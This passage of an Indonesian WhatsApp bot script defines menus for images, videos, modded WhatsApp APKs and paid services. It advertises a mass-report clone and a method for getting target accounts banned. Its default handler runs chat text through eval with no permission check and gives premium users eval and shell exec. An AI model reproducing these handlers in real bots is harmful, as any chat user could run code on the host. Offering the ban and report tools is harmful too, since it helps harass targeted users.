{title: `LOGO 21`, rowId: `${prefix}hw21`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 22`, rowId: `${prefix}hw22`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 23`, rowId: `${prefix}hw23`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 24`, rowId: `${prefix}hw24`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 25`, rowId: `${prefix}hw25`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 26`, rowId: `${prefix}hw26`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 27`, rowId: `${prefix}hw27`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 28`, rowId: `${prefix}hw28`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 29`, rowId: `${prefix}hw29`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 30`, rowId: `${prefix}hw30`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 31`, rowId: `${prefix}hw31`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 32`, rowId: `${prefix}hw32`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 33`, rowId: `${prefix}hw33`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 34`, rowId: `${prefix}hw34`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 35`, rowId: `${prefix}hw35`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 36`, rowId: `${prefix}hw36`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 37`, rowId: `${prefix}hw37`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 38`, rowId: `${prefix}hw38`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 39`, rowId: `${prefix}hw39`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 40`, rowId: `${prefix}hw40`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 41`, rowId: `${prefix}hw41`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 42`, rowId: `${prefix}hw42`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 43`, rowId: `${prefix}hw43`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 44`, rowId: `${prefix}hw44`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 45`, rowId: `${prefix}hw45`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 46`, rowId: `${prefix}hw46`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 47`, rowId: `${prefix}hw47`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 48`, rowId: `${prefix}hw48`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 49`, rowId: `${prefix}hw49`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 50`, rowId: `${prefix}hw50`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 51`, rowId: `${prefix}hw51`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 52`, rowId: `${prefix}hw52`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 53`, rowId: `${prefix}hw53`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 54`, rowId: `${prefix}hw54`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 55`, rowId: `${prefix}hw55`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 56`, rowId: `${prefix}hw56`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 57`, rowId: `${prefix}hw57`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 58`, rowId: `${prefix}hw58`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 59`, rowId: `${prefix}hw59`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 60`, rowId: `${prefix}hw60`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 61`, rowId: `${prefix}hw61`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 62`, rowId: `${prefix}hw62`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 63`, rowId: `${prefix}hw63`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 64`, rowId: `${prefix}hw64`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 65`, rowId: `${prefix}hw65`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 66`, rowId: `${prefix}hw66`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 67`, rowId: `${prefix}hw67`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 68`, rowId: `${prefix}hw68`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 69`, rowId: `${prefix}hw69`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 70`, rowId: `${prefix}hw70`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 71`, rowId: `${prefix}hw71`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 72`, rowId: `${prefix}hw72`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 73`, rowId: `${prefix}hw73`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 74`, rowId: `${prefix}hw74`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 75`, rowId: `${prefix}hw75`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 76`, rowId: `${prefix}hw76`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 77`, rowId: `${prefix}hw77`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 78`, rowId: `${prefix}hw78`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 79`, rowId: `${prefix}hw99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
 Menyediakan Logo Gratis Untuk Kalian Mau
Total 79 Gambar Dalam 
79 Command, Dengan Logo Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Logo Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listasupan':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `ASUPAN 1`, rowId: `${prefix}asupan1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `ASUPAN 2`, rowId: `${prefix}asupan2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 3`, rowId: `${prefix}asupan3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 4`, rowId: `${prefix}asupan4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 5`, rowId: `${prefix}asupan5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 6`, rowId: `${prefix}asupan6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 7`, rowId: `${prefix}asupan7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 8`, rowId: `${prefix}asupan8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 9`, rowId: `${prefix}asupan9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `ASUPAN 10`, rowId: `${prefix}asupan10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
Hii Guys Aku Menyediakan Video Asupan Untuk Penyemangat Hari Mu🥳
Silahkan Klick List Yang Ada di Bawah

TTD
© KAUM PASCOL

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Asupan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
case 'listcecan':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `CECAN 1`, rowId: `${prefix}cecan1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `CECAN 2`, rowId: `${prefix}cecan2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 3`, rowId: `${prefix}cecan3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 4`, rowId: `${prefix}cecan4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 5`, rowId: `${prefix}cecan5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 6`, rowId: `${prefix}cecan6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 7`, rowId: `${prefix}cecan7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 8`, rowId: `${prefix}cecan8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 9`, rowId: `${prefix}cecan9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 10`, rowId: `${prefix}cecan10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 11`, rowId: `${prefix}cecan11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 12`, rowId: `${prefix}cecan12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 13`, rowId: `${prefix}cecan13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 14`, rowId: `${prefix}cecan14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 15`, rowId: `${prefix}cecan15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 16`, rowId: `${prefix}cecan16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 17`, rowId: `${prefix}cecan17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 18`, rowId: `${prefix}cecan18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 19`, rowId: `${prefix}cecan19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 20`, rowId: `${prefix}cecan20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
Hii Guys Aku Menyediakan Foto Cecan Nih
Foto Cecan Random Dalam 20 Foto Semoga Suka 🥳

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Cecan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
case 'listjualan':{
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
 {title: `APK HACKED `, rowId: `${prefix}apkhack`, description: `Aplikasi Penghapus Data Memory`},
  {title: `APK BEALAJAR `, rowId: `${prefix}belajarkita`, description: `Aplikasi Belajar Bersama`},  
    {title: `APK PENULIS LAYAR `, rowId: `${prefix}drawany`, description: `Package : com.mlwrkz.drawanywhere
Versi : 32`},
    {title: `APK STYLE TEXT `, rowId: `${prefix}drawany1`, description: `Package : com.duy.asciiart
Versi : 404`},
    {title: `APK EDITOR `, rowId: `${prefix}drawany2`, description: `Package : com.gmail.heagoo.apkeditor.pro
Versi : 300`},
    {title: `MT MANAGER `, rowId: `${prefix}drawany3`, description: `Package : bin.mt.plus
Versi : 2.11.3`},
   {title: `WHATSAPP CLONE FAKE CHAT + UNLIMITED REPORT `, rowId: `${prefix}wonggbb`, description: `Package : com.gbwhatsapp
Versi : 2139210154`},
  {title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb`, description: `Package : com.gbwhatsapp
Versi : 2139210154`},
  {title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb1`, description: `Package : com.hwmodswa
Versi : 2139210154`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb2`, description: `Package : com.hwwhatsapp
Versi : 2139210154`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb3`, description: `Package : com.wago
Versi : 2139210154`},
{title: `WHATSAPP UNCLONE `, rowId: `${prefix}wonggb4`, description: `Package : com.whatsapp
Versi : 2139210154`},
 {title: `WHATSAPP UNCLONE `, rowId: `${prefix}hwcap1`, description: `Package : com.whatsapp
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap`, description: `Package : com.gbwhatsapp
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap2`, description: `Package : com.hwmodswa
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap4`, description: `Package : com.hwwhatsapp
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap3`, description: `Package : com.privatehwmods
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap5`, description: `Package : com.wago
Versi : 999999999`}
]
}
]
haikal.sendListMsg(m.chat, `
Aku Menjual Berbagai Kebutuhan Seperti
- WhatsApp Mods Imune Dan Aplikasi Lainnya

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Jualan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
case 'listjualan2':{
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `PANEL AMGEEKZ`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
   {title: `DIAMOND ML AMGEEKZ`, rowId: `${prefix}diamond`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `INFORMASI AMGEEKZ`, rowId: `${prefix}infoamgeekz`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `PULSA`, rowId: `${prefix}pulsa`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
haikal.sendListMsg(m.chat, `
Aku Menjual Berbagai Kebutuhan Seperti

- Diamond Mobile Legends
- Pulsa All Operator
- Panel Bot

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Jualan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
case 'listjualan3':{
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `SCRIPT BOT V13`, rowId: `${prefix}skripv13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `SCRIPT BOT V12`, rowId: `${prefix}skripv12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
    {title: `SCRIPT BOT TERMUX`, rowId: `${prefix}skriptermux`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
    {title: `NODE MODULES`, rowId: `${prefix}nodemodules`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
Aku Menjual Berbagai Kebutuhan Seperti
- Script Bot Whatsapp

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Jualan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
case 'payment':{
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `DANA`, rowId: `${prefix}pdana`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
   {title: `GOPAY`, rowId: `${prefix}pgopay`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `REKENING BCA`, rowId: `${prefix}pbca`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `


*Pembayaran*

A/N
Deni Saputra

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Pembayaran Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
//=================================================//
case 'listwibu':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 2`, rowId: `${prefix}pat`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 3`, rowId: `${prefix}lick`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 4`, rowId: `${prefix}yeet`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 5`, rowId: `${prefix}bite`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 6`, rowId: `${prefix}wink`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 7`, rowId: `${prefix}poke`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 8`, rowId: `${prefix}nom`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 9`, rowId: `${prefix}slap`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 10`, rowId: `${prefix}smile`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 11`, rowId: `${prefix}wave`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 12`, rowId: `${prefix}blush`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 13`, rowId: `${prefix}smug`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 14`, rowId: `${prefix}glomp`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 15`, rowId: `${prefix}happy`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 16`, rowId: `${prefix}dance`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 17`, rowId: `${prefix}cringe`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 18`, rowId: `${prefix}highfive`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 19`, rowId: `${prefix}handhold`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 20`, rowId: `${prefix}bonk`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
haikal.sendListMsg(m.chat, `
 Menyediakan Gambar Gratis Untuk Kalian Mau
Total 300 Gambar Dalam 
20 Command, Dengan Picture Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Wibu Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listban':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `UNBANED`, rowId: `${prefix}unbaned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `RESET CODE`, rowId: `${prefix}resetverif`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
Hii Guys Aku Menyediakan Methode Ban Menggunakan Gmail 🥳
Dan Ini Tidak Akan Selalu Tepat Sasaran Hanya Akan Berlaku Jika Si Target Memang Betul Telah Melukan Kesalahan Dalam Ketentuan layanan Komunitas WhatsApp

© WhatsApp LLC

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Ban Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
//=================================================//
default:
if (budy.startsWith('=>')) {
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isPrem) return replyprem(mess.premium)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isPrem) return replyprem(mess.premium)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})